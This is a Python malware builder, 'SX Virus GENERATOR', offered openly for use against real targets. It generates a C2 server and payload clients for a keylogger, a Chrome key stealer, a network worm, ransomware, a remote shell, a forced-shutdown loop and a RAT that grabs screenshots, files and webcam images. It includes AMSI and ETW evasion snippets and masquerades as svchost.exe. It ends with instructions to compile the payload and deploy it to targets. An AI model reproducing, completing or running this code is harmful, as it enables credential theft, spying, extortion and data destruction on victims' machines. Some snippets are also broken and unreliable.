import os
import sys
import socket
import threading
import time
import json
import base64
import struct
import subprocess
import shutil
from pathlib import Path
import hashlib
import ssl
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import win32api
import win32process
import win32event
import ctypes
from ctypes import wintypes

class SXVirusGen:

    BYPASS_MODULES = {
        "amsi_bypass": """
NtSetInformationThread = ctypes.windll.ntdll.NtSetInformationThread
THREAD_HIDE_FROM_DEBUGGER = 0x11
thread_id = ctypes.c_ulong(ctypes.windll.kernel32.GetCurrentThreadId())
hide_thread = ctypes.c_int(THREAD_HIDE_FROM_DEBUGGER)
NtSetInformationThread(ctypes.c_int(-1), THREAD_HIDE_FROM_DEBUGGER, ctypes.byref(hide_thread), ctypes.sizeof(hide_thread))

amsi = ctypes.windll.LoadLibrary("amsi.dll")
amsi.AmsiScanBuffer.restype = wintypes.UINT
amsi.AmsiScanBuffer.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p]
amsi.AmsiScanBuffer.amsiContext, ctypes.byref(ctypes.c_uint(0)), ctypes.c_uint(0), ctypes.c_uint(0), ctypes.c_void_p(0)
        """,
        
        "etw_patch": """
etwp = ctypes.windll.ntdll.EtwEventWriteFull
etwp_full = ctypes.cast(ctypes.cast(etwp, ctypes.c_void_p).value + 0x27c, ctypes.POINTER(ctypes.CFUNCTYPE(None))).value
etwp_full(None, 0, None, None, None, None, 0, None)
        """
    }
    
    PAYLOAD_HANDLERS = {
        "keylogger": {
            "client": """
import pynput.keyboard as kb
log_buffer = []
def on_key(key):
    log_buffer.append(str(key))
    if len(log_buffer) > 1000:
        send_data('keylog', ''.join(log_buffer[-500:]))
        log_buffer.clear()
kb.Listener(on_press=on_key).start()
            """,
            "exfil_interval": 900
        },
        
        "chrome_steal": {
            "client": """
import win32crypt, json, base64, sqlite3, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
local_state = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\\\Chrome\\\\User Data\\\\Local State')
with open(local_state, 'r') as f: state = json.load(f)
master_key = base64.b64decode(state['os_crypt']['encrypted_key'])[5:]
master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
send_data('chrome_key', base64.b64encode(master_key).decode())
            """,
            "exfil": "immediate"
        },
        
        "worm": {
            "client": """
import socket, os, threading
def spread(ip):
    try:
        s = socket.socket()
        s.connect((ip, 445))
        s.send(b'\\\\'+ip.encode()+b'\\ADMIN$\\'+os.path.basename(__file__).encode())
    except: pass
for i in range(1,255): threading.Thread(target=spread, args=(f"192.168.1.{{i}}",)).start()
            """,
            "spread": "network"
        },
        
        "ransomware": {
            "client": """
from cryptography.fernet import Fernet
key = Fernet.generate_key()
for root, dirs, files in os.walk('C:/Users'):
    for file in files:
        if file.endswith(('.docx','.pdf','.jpg')):
            try:
                with open(file, 'rb') as f: data = f.read()
                with open(file+'.crypt', 'wb') as f: f.write(Fernet(key).encrypt(data))
                os.unlink(file)
            except: pass
send_data('ransom_key', key.decode())
            """,
            "decryptor": True
        },
        
        "backdoor": {
            "client": """
while True:
    cmd = recv_cmd()
    if cmd == 'exit': break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    send_data('shell', result.stdout+result.stderr)
            """,
            "bind_shell": False
        },
        
        "sys_breaker": {
            "client": """
while True:
    subprocess.Popen(['shutdown', '/s', '/t', '5', '/f', '/c', 'System failure'], 
                    creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(300)
            """,
            "destructive": True
        },
        
        "rat": {
            "client": """
while True:
    cmd = recv_cmd()
    if cmd == 'screenshot':
        import pyautogui
        img = pyautogui.screenshot()
        img_b64 = base64.b64encode(img.tobytes()).decode()
        send_data('screenshot', img_b64)
    elif cmd.startswith('download '):
        try:
            with open(cmd[9:], 'rb') as f: send_data('file', base64.b64encode(f.read()).decode())
        except: send_data('error', 'file not found')
    elif cmd == 'webcam':
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            send_data('webcam', base64.b64encode(cv2.imencode('.jpg', frame)[1]).decode())
        except: send_data('error', 'webcam failed')
            """,
            "features": ["screenshot", "file", "webcam", "shell"]
        }
    }
    
    def __init__(self):
        self.output_dir = Path("./Generated-virus")
        self.output_dir.mkdir(exist_ok=True)
        self.session_key = os.urandom(32)
        self.c2_config = {}
    
    def configure_c2(self):
        self.c2_config = {
            "server_ip": input("C2 Server IP: "),
            "server_port": int(input("C2 Port [443]: ") or 443),
            "auth_token": hashlib.sha256(input("Auth Token: ").encode()).digest()[:16],
            "jitter": float(input("Traffic Jitter % [20-50]: ") or 30) / 100,
            "sleep": int(input("Sleep Seconds [5-30]: ") or 10),
            "tls": input("TLS (y/n): ").lower() == 'y'
        }
    
    def generate_secure_c2_server(self):
        server_code = f'''import socket, ssl, threading, json, struct, hashlib, hmac
from cryptography.hazmat.primitives import hashes

bots = {{}}
AUTH_TOKEN = bytes.fromhex("{self.c2_config['auth_token'].hex()}")

class SecureC2Server:
    def __init__(self, port):
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", port))
        self.sock.listen(100)
        print(f"C2 Server:0.0.0.0:{{port}}")
    
    def handle_client(self, client_sock, addr):
        global bots
        try:
            session_key = client_sock.recv(32)
            hmac_key = hashlib.sha256(session_key + AUTH_TOKEN).digest()
            bot_id = client_sock.recv(16).decode()
            bots[bot_id] = client_sock
            
            print(f"Bot connected: {{bot_id}}")
            
            while True:
                size_data = client_sock.recv(20)
                if len(size_data) < 20: break
                size = struct.unpack("!I", size_data[:4])[0]
                hmac_recvd = size_data[4:20]
                
                data = client_sock.recv(size)
                calc_hmac = hmac.HMAC(hmac_key, data, hashes.SHA256()).finalize()
                
                if hmac_recvd == calc_hmac[:16]:
                    msg = json.loads(data.decode())
                    print(f"[BOT {{bot_id}}] {{msg.get('type')}}: {{msg.get('data')}}")
                    
                    cmd = input(f"Bot {{bot_id}} > ").encode()
                    cmd_packet = struct.pack("!I", len(cmd)) + hmac.HMAC(hmac_key, cmd, hashes.SHA256()).finalize()[:16] + cmd
                    client_sock.send(cmd_packet)
                    
        except Exception as e:
            print(f"Client error: {{e}}")
        finally:
            try:
                if bot_id in bots: del bots[bot_id]
            except: pass
    
    def start(self):
        while True:
            client_sock, addr = self.sock.accept()
            threading.Thread(target=self.handle_client, args=(client_sock, addr), daemon=True).start()

if __name__ == "__main__":
    server = SecureC2Server({self.c2_config["server_port"]})
    server.start()
'''
        
        server_path = self.output_dir / "c2_server.py"
        with open(server_path, "w") as f:
            f.write(server_code)
        return str(server_path)
    
    def generate_payload(self, payload_type, settings):
        bypasses = settings.get("bypasses", ["amsi_bypass"])
        
        bypass_code = ""
        for bypass in bypasses:
            if bypass in self.BYPASS_MODULES:
                bypass_code += self.BYPASS_MODULES[bypass] + "\n"
        
        client_code = f'''{bypass_code}
import socket, ssl, time, random, json, struct, hmac, hashlib, base64, subprocess
from cryptography.hazmat.primitives import hashes
import ctypes

C2_IP = "{self.c2_config['server_ip']}"
C2_PORT = {self.c2_config['server_port']}
AUTH_TOKEN = "{self.c2_config['auth_token'].hex()}"
JITTER = {self.c2_config['jitter']}
SLEEP_TIME = {self.c2_config['sleep']}
SESSION_KEY = bytes.fromhex("{self.session_key.hex()}")

hmac_key = hashlib.sha256(SESSION_KEY + bytes.fromhex(AUTH_TOKEN)).digest()
sock = None

def send_data(msg_type, data):
    global sock
    msg = json.dumps({{"type":msg_type, "data":data}}).encode()
    msg_hmac = hmac.HMAC(hmac_key, msg, hashes.SHA256()).finalize()
    packet = struct.pack("!I", len(msg)) + msg_hmac[:16] + msg
    sock.send(packet)

def recv_cmd():
    global sock
    try:
        size_data = sock.recv(20)
        if len(size_data) < 20: return None
        size = struct.unpack("!I", size_data[:4])[0]
        hmac_recvd = size_data[4:20]
        
        data = sock.recv(size)
        calc_hmac = hmac.HMAC(hmac_key, data, hashes.SHA256()).finalize()
        
        if hmac_recvd == calc_hmac[:16]:
            return json.loads(data.decode()).get("cmd", "")
    except:
        return None
    return None

class SecureBeacon:
    def jitter_sleep(self):
        jittered = SLEEP_TIME * (1 + random.uniform(-JITTER, JITTER))
        time.sleep(max(1, jittered))
    
    def connect(self):
        global sock
        while True:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(socket.socket(), server_hostname=C2_IP)
                sock.connect((C2_IP, C2_PORT))
                
                sock.send(SESSION_KEY)
                sock.send(b"BOT0012345678")
                
                {self.PAYLOAD_HANDLERS[payload_type]["client"]}
                
            except:
                pass
            finally:
                try: sock.close()
                except: pass
            self.jitter_sleep()

if __name__ == "__main__":
    ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    SecureBeacon().connect()
'''
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        payload_path = self.output_dir / f"payload_{payload_type}_{timestamp}.py"
        with open(payload_path, "w") as f:
            f.write(client_code)
        
        return str(payload_path)
    
    def interactive_menu(self):
        print("SX Virus GENERATOR v1.0")
        
        self.configure_c2()
        
        payloads = list(self.PAYLOAD_HANDLERS.keys())
        print("\nPayloads:")
        for i, p in enumerate(payloads):
            print(f"  {i+1:2d}. {p}")
        
        choice = int(input("\nSelect payload: ")) - 1
        payload_type = payloads[choice]
        
        print("\nBypass modules: amsi_bypass,etw_patch (Write Name)")
        bypass_input = input("Enter (comma separated): ").split(",")
        
        settings = {
            "bypasses": [b.strip() for b in bypass_input if b.strip()]
        }
        
        server_path = self.generate_secure_c2_server()
        client_path = self.generate_payload(payload_type, settings)
        
        print(f"\nGenerated:")
        print(f"  Server: {server_path}")
        print(f"  Client: {client_path}")
        print(f"\nDeploy:")
        print(f"  1. python {os.path.basename(server_path)}")
        print(f"  2. pyinstaller --onefile --noconsole --hidden-import=cryptography {os.path.basename(client_path)}")
        print(f"  3. Deploy EXE to targets")

def virusgen():
    generator = SXVirusGen()
    generator.interactive_menu()